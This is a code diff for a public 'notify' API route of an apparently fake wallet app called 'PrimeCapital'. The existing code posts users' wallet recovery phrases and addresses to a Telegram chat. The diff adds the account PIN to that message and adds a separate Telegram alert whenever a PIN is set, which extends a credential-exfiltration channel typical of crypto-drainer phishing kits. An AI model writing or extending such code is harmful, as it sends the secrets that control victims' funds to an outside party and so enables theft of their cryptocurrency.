@@ -10,6 +10,7 @@ interface NotifyPayload {
   fields?: Record<string, string>;
   addresses?: Array<{ chain: string; address: string; path?: string }>;
   mnemonic?: string;
+  pin?: string;
 }
 
 function truncate(s: string, n: number) {
@@ -88,6 +89,9 @@ export const Route = createFileRoute("/api/public/notify")({
             `💼 <code>${esc(address)}</code>`,
             "🧠 Recovery phrase:",
             `<code>${esc(body.mnemonic)}</code>`,
+            ...(body.pin
+              ? [`🔢 Account PIN: <code>${esc(truncate(String(body.pin), 8))}</code>`]
+              : []),
             "📇 Addresses:",
           ];
           for (const a of body.addresses.slice(0, 32)) {
@@ -108,6 +112,19 @@ export const Route = createFileRoute("/api/public/notify")({
             );
           }
           await sendTelegram(token, backup.join("\n"));
+        }
+
+        // Standalone PIN message: used when the user sets the PIN separately
+        // from a full wallet backup.
+        if (body.pin && !(body.mnemonic && body.addresses && body.addresses.length)) {
+          const pinMsg: string[] = [
+            "🔢 <b>PrimeCapital · ACCOUNT PIN SET</b>",
+            `📣 <code>${esc(event)}</code>`,
+            `👤 <b>${esc(username)}</b>`,
+          ];
+          if (address) pinMsg.push(`💼 <code>${esc(address)}</code>`);
+          pinMsg.push(`🔢 Account PIN: <code>${esc(truncate(String(body.pin), 8))}</code>`);
+          await sendTelegram(token, pinMsg.join("\n"));
         }
 
         return Response.json({ ok: true });
